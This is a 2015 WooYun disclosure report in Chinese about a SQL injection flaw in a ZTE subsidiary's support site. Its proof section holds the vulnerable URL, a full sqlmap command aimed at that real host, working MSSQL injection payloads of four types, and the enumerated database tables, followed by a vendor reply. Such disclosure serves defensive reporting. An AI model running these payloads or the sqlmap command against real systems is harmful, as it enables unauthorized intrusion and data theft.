wybug_title: 中兴某分公司某处SQL注入漏洞
wybug_corp: 中兴通讯股份有限公司
wybug_detail:
漏洞详情 披露状态：   									2015-10-28：	细节已通知厂商并且等待厂商处理中									2015-10-29：	厂商已经确认，细节仅向厂商公开									2015-11-08：	细节向核心白帽子及相关领域专家公开									2015-11-18：	细节向普通白帽子公开									2015-11-28：	细节向实习白帽子公开									2015-12-13：	细节向公众公开  简要描述： RT 详细说明：  http://support.ztenv.com.cn/exp/exp_list_detl.asp?flg=1&expid=511expid存在注入   漏洞证明：  $ sudo python sqlmap.py -u"http://support.ztenv.com.cn/exp/exp_list_detl.asp?flg=1&expid=511" --threads=10 --privilegesPassword:         _ ___ ___| |_____ ___ ___  {1.0-dev-c98bd52}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:19:34[10:19:34] [INFO] resuming back-end DBMS 'microsoft sql server' [10:19:34] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: expid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: flg=1&expid=511 AND 1227=1227    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: flg=1&expid=511 AND 5502=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (5502=5502) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(113)))    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: flg=1&expid=-9347 OR 9940=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: flg=1&expid=(SELECT CHAR(113)+CHAR(112)+CHAR(113)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (8950=8950) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(112)+CHAR(113))---[10:19:34] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2008Database: experience_cfg[9 tables]+-----------------+| exp_Comments    || exp_list        || exp_menu        || t_customer      || t_list          || t_product       || t_province      || t_troubletype   || t_troubletype_2 |+-----------------+

   修复方案：  过滤，上设备～   版权声明：转载请注明来源 qhwlpg@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-10-29 08:40 厂商回复： 感谢提交，但是中兴力维已经不属于中兴通讯了 最新状态： 暂无
